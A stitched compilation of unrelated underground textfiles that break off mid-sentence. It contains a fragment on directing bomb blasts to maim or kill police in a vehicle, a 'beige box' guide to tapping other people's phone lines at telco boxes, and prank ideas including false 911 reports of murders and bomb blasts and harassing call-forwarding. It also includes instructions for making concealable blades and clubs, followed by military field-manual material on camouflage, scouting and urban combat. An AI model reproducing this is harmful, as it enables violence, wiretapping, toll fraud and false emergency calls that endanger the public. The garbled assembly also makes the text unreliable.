-=-=-=-=-=-=-=-=-=-=-=-=-
(A)     First make your bombs (Unless the occasion calls for something
        different) so that they direct the full force of the explosion in one
        direction.  A strong explosive device cannot be contained if it's
        entire force is sent into one direction.
(B)     Take advantage of the open cylinder transport vehicle, and direct the
        force of the explosion downward assuring a hole in the street, and
        two maimed or mortally wounded cops.
        Well this is about all for this article, and remember this is for

and were not all lucky enough to have cell phones or even if ya do, you might
not want other people listening in on your call.  That's where I come in.  All
you'll need to make free phone calls on someone else's phone line is:
1) 1 x a phone preferably with the keypad in the handset it self
2) 2 x alligator clips (red and green for practicallity)
3) 1 x screw driver
4) 1 x wire cutters
5) 1 x an I.Q. higher then room temperature
Okay, first things first, you're going to want to modify the phone for our uses
so first cut off the modular jack.  Inside your going to see 4 wires (though in
older phones you'll only see 2) and the only ones were interested in are the
red (ring) and green (tip).  The other 2 are usually white and black but are of
no use as they're for 2nd fone lines, extra features (call waiting, caller ID,
call block etc...) so just cut them off.  Now strip the red and green wires so
that you have about 1cm of bare wire.  Now wrap the red wire onto the red
alligator clip and do the same for the green wire.
Now that you've finished the hardware part of the beige box, you'll have to know
how to use it.  The principals are easy to understand,  you'll be hooking this
into any number of telco switching apparatus.  The easiest to start with is the
one that's probably on the side of your house right now.  Walk around your house
and find a small (3cm x 4cm) grey box that has the northern telecom logo (if you
live in Canada or your local telco logo if your somewhere else) and open it.  It
slides upwards so simply grab the sides and push up.  Now you'll see 5 posts.
It should look something like this:

Inside these boxes there's enough posts for 2 phones lines, so just pick the one
that has wires running to it and start connecting the phone like this.  Attach
the red gator clip to the red wire on the right.  The red wire is ALWAYS on the
right, remember this by using a saying like Red, Ring, Right or something.  Now
attach the green gator clip to the post next to the red one.  You should hear a
dialtone now.  Now as fun as this is, your still on your line so let's get to
the good stuff, using someone else's.
Look in the backs of businesses or in the ally's in your downtown sector (you
know, the place your mommy's always told you not to go) and look for silver
boxes about 30cm x 18cm that have the Nortern Telecom logo on it.  The older
ones can be opened by just pulling up on the tab near the bottom while the newer
ones have to be unlocked using a 7/16 hex socket and then opened by pulling the
bottom up.  When you open it, you should see something like this:
                    -----------------------------

There will be wires running all through the box and can be quite a mess
sometimes but anyway, this is almost the same as what we did back at the box on
your house but on a larger scale.  These boxes have the posts on an upward angle
so be carefull where you plug them in or you'll get nowhere fast.  Simply
connect the red clip to the red post as marked in my diagram and do the same for
the green clip.  If you hear a dialtone, great!  If not, try another set of
posts, remember, not all of the lines are connected so you might have just hit
a dead line.  Now you can dial all you want, anywhere you want.
You may want to know who's line your on though, for tapping, or maybe you just
want to know, so here's how to find out.  Call an ANI (Automatic Number
Identification) which will read back in a computerized voice what number your
calling from.  Try 1-800-MY-ANI-IS which is owned by MCI though at one time
there wass no pin, then there was due to over abuse (the pin was 220) then they
put on a fricken 12 digit pin!  Good luck hacking it :)  You might want to try

An non-800 that works nationwide is 404-988-9664.  The one catch
with this number is that it must be dialed with the AT&T Carrier
Access Code 10732.
Another non-800 nationwide ANI is Glen Robert of Full Disclosure
Magazine's number, 10555-1-708-356-9646.
Please use local ANI numbers if you can, as abuse or overuse can kill
800 ANI numbers.

Now, this can be VERY usefull but we all want to have some juvinile fun at some
time or another so here's some idea's to screw up someones lines :)
1) Try this, find the line of a major store, I like Toys 'R' Us personally but
anyway, call forward from thier line to someones you really don't like.  *72
in my area will bring up call forwarding.
2) Have fun with the 911 operator.  You're not on YOUR line so who cares if 
you screw around with them.  If you piss 'em off enough, they'll cut your line
and they'll probably have to deal with the police, 911, and Bell to get there
line back!
3) Order a crapload of food (pizza, chinese) from anywhere that'll deliver.
When they call back to confirm the order pick up AS SOON as the phone rings 
and confirm.  They'll get a crapload of food and they'll have to pay because
it was confirmed. 
4) A variation on the 911 thing, call up the police or 911 again, whoever and
say that your in the back room of this business or somthing and say there's
just been a doube, triple or quadruple murder, whatever.  You could also use
a banks line and say you were working late and there's just been an explosion
in the vault.  They'll get the cops and bomb squad out there!
Have fun, and don't get caught :)

#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#
   Weapons are fun to use, but they are also fun to make. All you need is some
spare time some files (or electric grinder) and an imagination. It can be a 
fun past time. In making weapons your main objective is to do any of the 
following:
a)make a blunt end
b)make a sharp edge
or basically make something that could hurt someone.
   
   Any piece of metal (as long as it's not too soft) can be honed to a blade
and if you make it small enough you can conceal it easily. The only problem
is, where do you get the metal. Well you can go to a hardware store and buy
a hacksaw blade (this is EXCELLENT metal) and file it into a blade with a grinder
or file. If you use a grinder make sure you have an ice cube handy so you can
temper the blade because it gets HOT!! If you're into wood carving you can make
a nice club out of a thick branch (make sure it's a hardwood like maple or something)

			   Chapter 1: PROTECTIVE MEASURES
			      Section I: ENTRENCHMENTS
Entrenchments are located to cover a selected are with fire and, at the same 
time, provide concealment from aerial and ground observation and protection 
from enemy fire. The three most commonly used entrenchments are briefly 
explained in this section.
  A. THE FOXHOLE. Foxholes are entrenchments normally dug for individual 
     protection when contact with the enemy is imminent or in progress. They 
     provide protection against small arms fire, artillery shell fragments, 
     airplane fire or bombing, and the crushing action of tanks. The one and 
     two-man foxholes are the basic types, the choice of type resting with the 
     squad leader if not prescribed by higher authority. The two-man foxhole 
     consists essentially of two adjacent one-man foxholes. It is used when
     men must work in pairs or when, for psychological reasons, battlefield 
     comradeship is desirable.
  B. THE INDIVIDUAL PRONE SHELTER. A prone shelter may be dug more quickly 
     than a foxhole, and gives considerable protection from small arms fire, 
     artillery and aviation. However, since it is shallow, it does not provide 
     protection against the crushing action of tanks, and it is not suitable as
     a firing position.
  C. CONNECTING TRENCHES. Connecting trenches are conspicuous to aerial 
     observers and on aerial photographs, and thus reveal the defensive 
     dispositions. Continuous connecting trenches are not dug a normal 
     procedure. When two forces are in contact and dispositions have been 
     revealed beyond any question, a few short trenches may be dug in 
     inconspicuous place to permit necessary daylight movement across exposed 
     areas. Necessary connecting trenches may also be dug in close country,
     such as jungle, where the position probably will not be disclosed.
     Further, they may be dug whenever the improved protection, control,             
     communications and supply outweigh the sacrifice of concealment.
			       Section II: CAMOUFLAGE
     Camouflage has been defined as the science of military deception. It 
affords protective concealment for your position so that can see without 
being seen. This permits you to strike first, fatally, and at no cost to 
yourself.
  A. HIDE, BLEND, DECEIVE. There are three general ways in which you can 
     camouflage yourself. You can hide, you can blend yourself with your 
     surroundings, or you can deceive the enemy.
     1. To hide yourself, use the advantages offered by nature in the terrain.  
	If nature has given you enough camouflage for you and your supplies,
	let nature do the work unaided.
     2. Blend with your surroundings so that you match the surrounding terrain 
	features and are not conspicuous.
     3. You can deceive the enemy by using such tricks as making a dummy 
	position with poor camouflage. This may lead the enemy to the dummy
	position and your range of fire.
  B. RULES FOR CAMOUFLAGE. In addition to these general means of camouflaging 
     yourself, there are a number of rules which you need to learn well if you
     are going to protect yourself successfully.
     1. Pick out a position which uses as much as possible of the tactical and 
	concealment values of the terrain.
     2. Practice camouflage discipline by keeping your position free of 
	tell-tale signs of occupancy such as paths, dead leaves on camouflage 
	materials, and so on.
     3. Select your camouflage materials to match the color and texture of the 
	local terrain. If you use natural materials, such as grass or trees,
	keep them fresh in appearance.
     4. Avoid over-camouflaging your position your position. This is just as 
	obvious as no camouflage. Use common sense in covering regular
	outlines and tell-tale shadows.
     5. Don't look up from your position. Your face is smooth and light 
	colored, and reflects a great deal of light. Never look up when a
	plane is overhead, or if you do, break off a branch or bush and look
	through the leaves carefully.
     6. Never throw down a cigarette. Pinch out the fire, split the paper and 
	roll it into a small ball. Scatter the shreds of tobacco around so no
	clues will be left.
     7. Some objects shine like mirrors in the sunlight and can be seen for 
	miles. Watch your mess gear and weapons. Keep them under cover or in
	the shade.
     8. Tape your dog tags together so that they do not clink.
     9. Follow the paths laid out for you. The paths may be wired, they may be 
	taped, or they may just be blazed. But they were laid out for a
	purpose. Don't try to take short cuts away from them; you make new
	tracks.
     10. Don't cut the brush or limbs you plan to use for camouflage from a
	 bush next to your position. Go some distance for them and don't take
	 them all from the same place.
     11. Bury your empty ration cans and all other waste material. Fill the 
	 dirt back in very carefully and cover the spot with leaves or dry
	 grass. Go so far as to sod the spot if you find it necessary.
     12. Stay off the horizon. It is important that you know where the horizon 
	 is.  If the enemy is downhill from you, you usually are on his
	 horizon, and present him with a good target.
     13. Stay in the shadows and also be sure you have a blending background.  
	 You can be seen in silhouette if you are in a shadow with a lighted 
	 background beyond you.
     14. Smoke billowing up in a strait column is always bad. Build your fires 
	 under trees or put a screen over the fire.
			  Section III: ELEMENTARY OBSTACLES
   You can sometimes put out artificial obstacles such as wire, so that the 
enemy will be channeled into areas where he is covered by your fire. These 
obstacles are placed in woods, tall grass, brush, or some other place where 
they can be hidden, if it is possible. They have to be covered by fire at 
all times to prevent the enemy from removing, destroying, or surmounting them.
   At all times wire is used, there should be some alarm system attached to 
the wire.  One of the simplest and most effective alarm systems consists of a 
few pebbles place in empty tin cans, which are fastened to the wire.
   A. TACTICAL OBSTACLES. Some obstacles are called tactical obstacles.  
      These are obstacles placed to hold the enemy in areas covered by
      defensive fires, particularly by the final protective fire of machine
      guns. Such obstacles can be double apron fences, concertinas, or a
      combination of both. Two parallel rows of double apron fences or a
      pyramid of three concertinas fastened together by strands of barbed wire
      are common.
   B. PROTECTIVE OBSTACLES. Protective obstacles are used to surround a 
      platoon defense area completely. They are set up to hinder a surprise
      attack by the enemy. They must be placed beyond hand grenade range. A
      single four-strand barbed wire fence can become a protective obstacle.
   C. THE ABATIS. An abatis is made by felling dead tress or interlacing live 
      tree branches to form a barrier to enemy infantry. In addition to trees, 
      wires may be intertwined among branches and booby traps can be placed in
      an abatis, if ordered.
------------------------------------------------------------------------------
			 Chapter 2: SCOUTING AND PATROLLING
			     Section I: SCOUTING BY DAY
   When you go out as a scout in daylight, there are several tricks which are 
important to you. These tricks come under the names over cover, concealment, 
camouflage, and the principles of movement.
   A. COVER. Cover is protection against the fire of the enemy. You are of 
      no use as a scout the enemy sees you and hits you.
     1. Cover can be a natural object like a tree, rock, ditch, or an
	embankment. It also can be a shell hole or a demolished building. It
	is easy for you to pick out cover as your surroundings afford.
     2. It is not enough to know this, however. You may be a scout in a place 
	where no such objects are located.  You must learn to study the ground
	and find protection where, at first, there seems to be none.  The
	slightest depression in the ground may give you shelter from the
	enemy's fire.
     3. Some cover will be good for one purpose and worthless for another. For       
	instance, a reverse slope will give you protection from rifle or
	machine gun fire, but will not give full protection from the high-angle
	fire of mortars and howitzers.
     4. This brings up another important part of cover. You must study the  
	ground ahead carefully when you are about to move forward under fire
	from your position. Select as your next position one that offers cover.
	Then move to it, and move fast.
     5. When you're near the selected position, hit the deck and roll over 
	rapidly a few times. This is done to fool any of the enemy who may
	have seen you rush out.  When the enemy sees you go down, you are some
	distance from your selected position and he will not be able to spot
	your position accurately.
     6. If time permits, artificial means can be used to obtain or improve 
	cover.  This means you can dig trenches, erect barricades, and so on.  
	Artificial means are always used in a defensive position.
   B. CONCEALMENT. Where the word "cover" is used to mean protection from 
      enemy fire, the word "concealment" means protection from observation by
      the enemy. Concealment may be natural or artificial.  Natural concealment
      is that given by trees, grass, leaves, and so on, without any man-made
      changes. Artificial concealment is that which you construct yourself. You
      must become an expert in the use of concealment to be a good scout. Here
      are some rules to help you conceal yourself:
     1. REMAIN MOTIONLESS WHILE YOU ARE OBSERVING. Movement can attract the eye 
	of the enemy and give away your position.
     2. USE ALL AVAILABLE CONCEALMENT. Always act as though you were being 
	watched and use the best available concealment.
     3. OBSERVE FROM THE PRONE POSITION. This position, lying flat on your 
	stomach, gives you a low silhouette and makes it harder for the enemy
	to see you.
     4. EXPOSE NOTHING WHICH GLISTENS. Reflection of the sun flashing on bright 
	objects like a wrist watch, knife, or bright button will attract the 
	observation of the enemy at once.
     5. BLEND WITH THE BACKGROUND. Be sure that the color of you and your 
	clothes does not contrast too much with your surroundings. Something
	like a bleached khaki uniform on green grass can be seen quickly.
     6. STAY IN THE SHADE. When you are in the shade, you throw no shadow and 
	you'll be harder to see.
     7. BREAK REGULAR OUTLINE OF OBJECTS. If you put garlands around your 
	rifle, twigs in your helmet, and use other tricks or camouflage, you
	break the regular shape of objects and make them harder to recognize.
     8. KEEP OFF THE SKYLINE. If you outline yourself against the sky at any 
	time, you can be observed from even a great distance.
     9. When you are observing as a scout, look around one of the SIDES of an 
	object unless you can look THROUGH it.
     10. You fire around the right hand side of an object, unless you are left 
	 handed.
     11. You NEVER look or fire OVER THE TOP of concealment or cover unless the 
	 outline of the concealment is already broken, or you can otherwise
	 blend in with a suitable background.
     12. When an airplane approaches, you take a prone position, face down, and 
	 remain motionless. If the airplane comes upon you by surprise, stand
	 still and cover your hands so that their whiteness will not show. Do
	 not look up, otherwise the occupants of the plane will observe the
	 whiteness of your face.
     13. A small, thin bush in the shadow of a large bush makes a good 
	 observation point. Lone trees or rocks, fence corners, and other
	 outstanding landmarks are easily picked out as targets by enemy
	 observers. Remember this when you are concealing yourself.
   C. CAMOUFLAGE. You already have seen by reading the above rules on cover 
and concealment that camouflage will be an important part of your scouting.  
There are four things involved in successful camouflage. They are: ability 
to recognize and take advantage of all forms of nature concealment available; 
knowledge of the proper use of the available vegetation, soil, and debris for 
camouflage purposes; knowledge of the proper use of artificial or issued 
camouflage materials; and camouflage discipline. Listed below are some
practical camouflage rules.
     1. You paint splotches across you nose, mouth and cheeks for scouting in 
	areas where there is vegetation. You can paint your hands with
	lampblack, burned wood, cork, crankcase oil, grease paint, or petroleum
	jelly with soot in it. Dried mud shows up light and many black
	substances glisten and reflect light, so be careful what you choose to
	paint your face and hands with. Green grass, crushed in your hands, and
	applied to your skin, will make a stain that lasts 10 hours. No exposed
	skin should be overlooked in splotch painting. The back or your neck,
	chest, lower arms, and both the backs and palms of your hands should be      
	painted.
     2. If you are able to take a position among rocks or in open ground, tone 
	your skin to a solid blending color instead of using splotch painting.
     3. Cover any of your equipment that can reflect sunlight.
     4. White garments blend with snowy areas, especially on a cloudy, windy 
	day.
     5. You can make your own camouflage clothing from gunny sacks or sand bags 
	if you have no other way. An improvised suit can be made in the field,
	when a standard jungle suit is not available, by painting ordinary
	utilities with irregular splotches. A dye, paint, grease, or oil may be      
	applied with an improvised dauber, or a pattern may be stamped on a
	block of wood.
     6. A few leaves on your helmet help conceal the shine and break the
	outline.
     7. Remember: Fatigue leads to carelessness.
   D. MOVEMENT. Some of the principles of movement have already been 
mentioned. As a scout you move from one concealed location to another and 
there are rules to help you move around successfully. Some of these rules 
are as follows:
     1. Remain motionless when you are not changing your position.
     2. When you are observing, lift your head slowly by steadily, without 
	making any quick movements.
     3. When you are changing your position by running, spring up and run with 
	your body bent low and drop to earth quickly.  Take advantage of any
	walls, ditches, or similar cover.
     4. How to CREEP: Your body is kept free from the ground with your weight 
	resting on forearms and lower legs, you rifle is cradled in your arms
	to keep the muzzle out of the dirt. Move forward by alternately
	advancing the elbows and knees, and your knees always must be kept in
	a position well behind the buttocks.
     5. How to CRAWL: Body and cheek are flat against ground, rifle is dragged 
	along on the toe of the butt with finger over muzzle to keep dirt out.
	To move forward, push arms forward and cock left leg forward. Pull
	yourself forward with arms, push with the left leg. You can move faster
	by alternating legs, but this makes silhouette higher and the rifle
	gets in the way of the leg.
     6. Notice creeping is faster than crawling but creeping causes a higher 
	silhouette.
			    Section II: SCOUTING BY NIGHT
   When you go on a night scouting mission some of your problems, such as
cover, concealment, movement, and camouflage, are going to be something like a
day scouting mission. Night scouting presents additional problems, however.
   A. NIGHT VISION. You have to adapt your eyes to seeing at night. This is 
      night vision. The human eye adapts itself for seeing in the dark by 
      enlarging the pupil in order to let in more light. If you are tired or
      have a vitamin deficiency, your night vision will not be as good as it
      could be. You prepare your eyes for a night mission by staying in
      darkness for about an hour before you go out. If you cannot stay in the
      dark, keep out of the lights around you as long as possible and avoid
      looking strait at them. If it is possible, wear red goggles, or keep one
      eye closed.
   B. APPEARANCE AND SIZE. Darkness not only makes it hard or impossible for 
      you to see objects, but it also changes their appearance and apparent
      size. Details are blotted out. As a scout you have to train yourself to        
	    identify objects by black outlines at night.
     1. A tree seen against the night looks much smaller than it does in the 
	daytime because the twigs and at the tips of the branches can not be
	seen at night. For the same reason, an airplane caught in the beam of a
	searchlight looks larger than the same plane when it is seen as a black
	mass against a dimly lighted sky.
     2. Night glasses, which may be issued to you, make it possible to see 
	objects or parts of objects that would otherwise be too small to be
	seen at all, and help identify objects already spotted.
     3. Any kind of light is quickly visible at night. Under ordinary
	conditions, a lighted match can be seen for several miles. Under ideal        
	conditions of darkness and atmosphere, a candle is said to be visible
	for 10 miles.   
   C. SOUNDS. When you are a scout at night, the SOUNDS of things will be 
      very important. You depend mostly upon your ears to get information about
      the enemy and you have to exercise every care to keep the enemy from
      hearing you.
     1. When scouting at night, stop frequently to listen. If you are required 
	to wear a helmet, remove it when you stop so that sounds are not
	distorted by the helmet over your ears.
     2. By practicing a great deal, you can learn to listen for long periods in 
	perfect silence. This is what you have to do when you are scouting.
     3. Remember that sounds are transmitted a greater distance in wet weather 
	and at night than in dry weather and in the daytime.
     4. If you hold your ear close to the ground, you can hear much better such 
	sounds as persons walking and the noise of vehicles.
   D. SMELLS. Use your nose as well as your ears. Your sense of SMELL may warn
      you of enemy fires, cooking, picket lines, motor parks, gasoline and oil 
      engines, bodies of water, and the presence of troops.
   E. TOUCH. Your SENSE of touch is going to mean much to you when you are a 
      scout at night. Learn to operate and adjust your equipment by the sense
      of touch alone. You also are going to have to use your hands instead of
      your eyes to feel and recognize objects in the dark.
   F. CONCEALMENT. Concealment at night is provided by darkness, unless there 
      is bright moonlight. If the moon is giving light, however, you have to
      use the same methods of concealment that you use in daylight.
   G. MOVEMENT. The principles of movement at night are somewhat different from
      those for daytime scouting. At night, you must be able to move in 
      absolute silence, for your safety depends on your silent movement. The
      five principles of night movement are:
     1. Move by bounds you have determined in advance.
     2. Run at night ONLY IN AN EMERGENCY.
     3. Stop frequently and listen intently at each stop.
     4. Take advantage of sounds which may distract the enemy to cover up your 
	own movements.
     5. If you fall down, don't cry out. Fall as silently as possible.
   H. HOW TO MOVE AT NIGHT. Experience has taught the Marine several things 
      about movement at night. These aids to movement are given here. When you
      need them, remember them.
     1. To walk at night, balance the weight of your body on your rear foot, 
	until a secure spot is found for your forward foot. You lift your
	forward foot high to clear any stiff grass, brush, wire, or other
	obstruction that might cause you to stumble. With your weight still
	balanced on the rear foot, you lower your forward foot gently, with toe
	first. You lower your foot, toe first, because your toe is more
	sensitive and can feel an obstruction more quickly than the rest of
	your foot. When you have located with your toe a spot free from
	anything that might make a noise, you lower your heel gently. Then your
	weight is balanced on that foot and the other foot is advanced.
     2. To creep at night, get down "on all fours" with the weight of your body 
	resting on your hands and knees. Place your rifle on the ground on your
	right, with the operating handle up. With your left hand, feel for a
	place free of rocks and twigs in front of your left knee. Leave your
	left hand in place and move your left knee forward to the place you
	have cleared. Do the same with your right hand and knee. As you move,
	clear spots for your rifle and lift it forward.
     3. You crawl at night much the same as you do in the daytime, being 
	careful not silhouette yourself. Crawling at night must be done
	silently, however, and is slow and tedious.
   I. OTHER PRECAUTIONS. In addition to these aids to movement in night 
      scouting, there are other methods which you can use to avoid detection.
     1. If it is necessary for you to whisper, expel most of the air from you 
	lungs before you do. This does away with the hissing sounds usually
	made by a whisper.
     2. If the enemy has been using gas, keep away from depressions in damp and
	rainy weather. Gas can remain in these places quite a while.
     3. Whenever you stop, LOOK and LISTEN.
     4. Do not look at an object too long. This strains your eyes.
     5. If caught in a flare, drop quickly in the split second that the enemy 
	is blinded after the flare light. If you hear the flare discharged,
	drop to the ground before it bursts. Never look at a flare; you will
	impair your night vision for nearly an hour.
     6. When you come upon patrols or persons, consider all of them unfriendly 
	until you identify them. When you meet someone, crouch low in order to
	get him silhouetted against the sky and offer him only an indistinct
	target if he proves to be an enemy. If you are fired upon, do not
	return fire except to avoid capture.
     7. If you are carrying a luminous compass or watch, be sure that the dial 
	has some covering on it.
   J. PASSING OBSTACLES. The proper passing of obstacles such as wires and 
      trenches is another thing you need to know about night scouting. Whenever 
      possible, avoid enemy obstacles, which are frequently covered by their
      weapons.
     1. All of you movements near wire must be slow and cautious because of the 
	danger of booby traps and mines. To pass over wire, walk over low wire
	at night by grasping the first strand with one hand and reaching
	forward with the other hand to feel for a clear spot on the ground.
	Feel for a spot where you can place your foot without touching another        
	strand, or a mine, boobytrap, or any object that might make a noise.
	When you find such as spot, lift your foot up and over, close to the
	hand grasping the wire. Place your foot beside your other hand to avoid       
	catching it on another strand. If you are armed, sling your rifle
	across your back and follow the same procedure.
     2. To pass under wire, move on your back by feeling ahead and above for 
	the strands of wire, and inching yourself along, holding the wire clear
	of your body. Be careful not to tug on the wire or jerk it. You might
	make a noise or set off a booby trap. If you have a rifle with you,
	you can put it on your stomach, with the bayonet beside your head, or
	you can place it between your body and right arm, and have the bayonet
	resting on your shoulder.
     3. When cutting wire, if you are alone, cut the wire near a picket to 
	avoid having a loose end fly back. When you are operating with another 
	Marine, one of you can hold the wire in both hands while the other cuts
	the wire between the hands. Then you bend or roll back the wire to make
	an opening sufficient for passage. When cutting wire, wrap a cloth
	around it to muffle sound. If the gap is cut in enemy wire, it is well
	to leave the top wires intact. This lessons changes of discovery.
			       Section III: OBSERVING
   A. INTERPRETATION OF SIGNS.
     1. The size of a bivouac area usually indicates the number of enemy there. 
	You can check laundry, ration tins, dumps, and so on for clues as to
	the size of the enemy force.
     2. Tracks on a road can show you what kinds of troops or vehicles are in 
	the body and their direction of march.
     3. The state of the bivouac and the amount of abandoned material about can 
	reveal the enemy's condition to you. For instance, if you find food
	left uneaten, you can assume that he is well supplied. If all scraps of
	food have been eaten, you can assume that he is short on supplies.
     4. You can check a track for the time it was made. A freshly made track 
	has sharp edges and ordinarily has signs of moisture which disappear in
	about 15 minutes.
     5. You can tell whether a footmark was made by a running or walking man. A
	running man digs his toes into the ground. His walking footprint is
	fairly even.
     6. You can easily tell the direction of travel of a car by the way its 
	tracks pass across ruts or track water from puddles.
     7. You can estimate the speed of a vehicle by the amount of mud splattered 
	or dirt scattered by it. Slow moving wheels leave shallow, smooth
	tracks. Faster moving wheels cut deeper.

********************************
TRACKING: The ability to track and interpret trail signs is particularly
valuable in counterguerrilla warfare. The basic concepts of tracking are:
   1. Displacement:
     a. Footprints.
	1. The last person in a party normally leaves a clear set of 
	   footprints, study these for distinguishing marks.
	2. Deep toe marks in normally spaced prints indicate the person was 
	   carrying a heavy load. 
	3. Deep toe marks in widely spaced prints indicate the person was 
	   running.
	4. Water in foot prints made in low, marshy areas will remain muddied 
	   for approximately 1 hour.
     b. Foliage
	1. Displaced grass and vines will be pointing in direction of movement.
	2. Rocks and leaves overturned will display darker undersides.
	3. Scuffed bark and foliage will display a lighter color.
   2. Staining:
     a. BLOOD STAINS. Fresh red blood stains turn to brown after a short 
	period of time. Observe for stains on leaves and underbrush and note 
	their height. This may indicate the location of the wound.
     b. MUD. Mud carried from one area to another may provide an indication of 
	where party came from.  Water is always muddied downstream from fording 
	sites.
   3. Littering: Capitalize on the poor discipline of littering guerrillas. 
      Observe for scraps of paper and cloth and abandoned equipment marking 
      trails.  
   4. Weathering:
     a. Rain tends to round out or obliterate footprints depending on 
	intensity of rain. Rain will flatten paper and cloth litter.
     b. Sunlight will cause crumbling of the moist dirt ridge normally 
	outlining a fresh footprint within 1 hour. Light colored litter becomes 
	yellowed from sunlight in 2-3 days. Observe the difference in color 
	between the sides facing the ground and the side facing the sun, to
	determine the age of litter.
     c. Wind displaces leaves, twigs and small debris into footprints. Prints 
	should be examined to determine whether the debris was crushed by the 
	party being tracked, or was blown into the tracks by the wind. 
     d. Weather elements will cause some exposed metal to rust. Spots of rust
	will normally appear on rims of opened cans within 12 hours. This 
	varies with specific geographic locations.
   5. Interpretation. Analyze all the factors of displacement, littering, 
      staining and weathering to determine the who, what, where, when, how,
      and why of the tracked party, from the various trail signs.
   6. General Rules Utilized in Tracking:
     a. If possible, observe tracks by looking toward the sun.
     b. If tracks are lost, mark the last trail sign and search for the trail
	in concentric circles from the marked point.
     c. Remember the date of the last rain and significant wind to determine
	the age of trail signs.
     d. Become familiar with weathering effects peculiar to the specific area
	of operations.

		       CHAPTER THREE: COMBAT IN BUILT-UP AREAS
			    Section I: INDIVIDUAL CONDUCT
   When fighting in towns and cities it is essential for you as a member of a 
team to observe certain rules affecting individual conduct. If you develop 
the correct automatic reactions to all situations, you will help keep 
casualties to a minimum. A few of the rules are as follows:
   1.  All movements must be fast. When not moving, you must be in a covered 
       position.
   2.  When climbing, use simple methods. One is the PUSH UP METHOD. Two men
       face each other. The man to be lifted stands between them. The men
       lifting bend over and put one hand under the instep of one foot and the 
       other hand on the knee of the man to be lifted. The two men lifting now
       straiten up, shift the hand from knee to foot and push up. The man being
       lifted keeps his legs together and holds them stiff. His feet are kept 
       away from the wall so that the weight will be placed on his hands as he
       is lifted. This maintains balance. The weapons should be carried in the
       hand.
	 Another lifting method is the RIFLE AND SLING PULL UP. To get the last 
       man up on a roof, have two men lower rifles. The man to be lifted grasps
       the slings, and as the others pull, he walks up the side of the wall.
   3.  When firing, stay away from openings through which you are firing. Use 
       all available cover.
   4.  To get maximum protection from the available cover, it will be necessary
       sometimes to fire from the left shoulder. Fire from sides, not over 
       objects.
   5.  When observing around corners, lie flat on the ground.
   6.  When observing from roof tops, do not get silhouetted. Remember to have
       a background with which you will blend.
   7.  When going over any type of obstacle, move fast. Roll your body over the
       object, and move immediately to a covered position.
   8.  Work in pairs at all times. This provides covering fire for individual
       movement and assistance in entering buildings.
   9.  The bayonet is seldom used. It hinders climbing and movement in 
       buildings.
   10. To search a building, a minimum number of men is used. Too many men get
       in one another's way. To search a room, use two men. First, throw a 
       grenade into the room. Follow the explosion of the grenade closely to 
       take advantage of the concussion and fragmentation effect on the enemy.
       The first man into the room puts his back to the nearest wall and 
       covers the room. The second man enters immediately and searches the room
       carefully for any signs of the enemy.
   11. When no entrance is available into a building, or movement is stopped
       within a building by walls, demolitions may be used to force an 
       entrance. This is called "mouse holing".
			       Section II: THE ATTACK
   There are two methods of attack when fighting in cities and towns:
   A. AGAINST STEADY RESISTANCE. The first method is used against continuous
      enemy resistance. In this case, you stay out of the streets and all open
      areas. Movement is from house to house. Each building is searched and
      completely cleared of the enemy. No building is by-passed.
   B. MOPPING UP. The second method is used for mopping up small scattered
      enemy groups. When attacking against this type of resistance, you move in
      the streets until fired upon by the enemy. Formation is a column of files
      on each side of the street, each column observing the opposite side of 
      the street. Each individual in the squad moves from one covered position
      to another covered position. Scouts should be well out to the front, but
      close enough to be controlled by the squad leader. When the squad is hit
      by enemy fire, all hands take cover and prepare to attack the located 
      enemy resistance. Once the attack is underway, keep out of streets and
      open areas. There are a few specific points to remember in mopping up 
      operations:
	1. When attacking a building, attack from the top down. In this way,
	   you will have gravity working with you, and the enemy will not be
	   trapped in the upper floors. A trapped enemy fights more stubbornly
	   than one that has an avenue of escape. Drive the enemy down and out,
	   then eliminate him by fire on the outside of the building.
	2. A "killing zone" should be set up around any building under attack.
	   This means surrounding the building by fire to prevent movement in
	   or out of the building.
	3. Attack the blind side of a building if one is available.
	4. Once your attack has put you inside the building, be systematic. Get
	   to the top of the building first, and then search room by room 
	   through the entire building.
	5. Covering fire must be used to cover all movements. If the wind is
	   favorable, smoke can be used to blind the enemy; use it with the 
	   covering fire to protect all movements in the open.
	6. Once a building is cleared of the enemy, all-around security must be
	   put out and a hasty defense set up against counterattack.
	7. Each building that is cleared of the enemy must be marked as 
	   friendly. The marking should be placed on the rear of the building
	   on one of the upper decks so that adjacent units and following 
	   troops will not fire at movement seen in the buildings.
	8. Orders issued must be clear and detailed. Each man should know
	   thoroughly his part of the attack.
			     Section III: SQUAD TACTICS
   If the attack of the building is to be successful, it must be well planned,
properly coordinated, and executed with surprise and thoroughness. There are
several points to be remembered:
   1. Before attacking, the squad leader must make an accurate reconnaissance
      of the building to be attacked.
   2. The rifle squad is ordinarily organized into two parts for the attack: a
      SEARCHING PARTY, consisting of one fire team; a COVERING PARTY, 
      consisting of two fire teams.
   3. The searching party makes the initial entrance and searches the building
      under attack. If the building is too large for one fire team to search,
      an additional searching party may be used. When more than one searching
      party is operating in one building at the same time, each must be given
      a definite area of responsibility. This is necessary to avoid conflict
      between them.
   4. The covering party gives covering fire to facilitate the advance of the
      searching party.
   5. The searching party secures an initial foothold, normally in one room.
      The fire team leader and BAR (Browning Automatic Rifle) man remain in the
      initial foothold position, maintaining communications to the rear and
      holding this initial entrance area so that reinforcements will have a
      safe place to enter. The other two men (buddy team) in the searching
      party work immediately to the top of the building and systematically
      search downward.
   6. When the building is cleared, the searching party fire team leader posts
      security, then signals to the squad leader that the building is clear.
   7. The squad leader moves the remainder of his squad into the cleared
      building and organizes a hasty defense. The building is marked as 
      friendly. The squad is then reorganized and prepares to continue the
      advance as before.
			      Section IV: WEAPONS USED
   Since the weapons your outfit uses have certain capabilities and limitations
when used in towns, they are usually assigned to specific kinds of jobs.
   1. Your M1 rifle, when actually used inside buildings or in close quarters
      fighting, is usually fired from the hip. This makes it possible for you
      to fire more rapidly at unexpected targets.
   2. You can safely use a Browning Automatic Rifle only on the ground floor 
      of buildings. Its weight makes it clumsy and hard to handle inside. 
      However, the BAR makes a good weapon for covering fire.
   3. The hand grenade is a good weapon in village fighting. Before you enter a
      room, throw in a grenade to force the enemy to take cover and allow you
      to enter without being exposed to aimed fire. Smoke (WP) grenades are 
      very good to smoke the enemy out of basements, underground passages, and
      so on.
   4. Rifle grenades and rockets fired from "bazookas" are effective against
      barricades, sand-bagged emplacements, emplacements behind the walls of
      buildings, and against armored vehicles.
   5. Mortars are used against groups of enemy personnel, automatic weapons 
      that have been spotted, and rooftop targets.
   6. Machine guns establish "killing zones" in streets and open areas, and
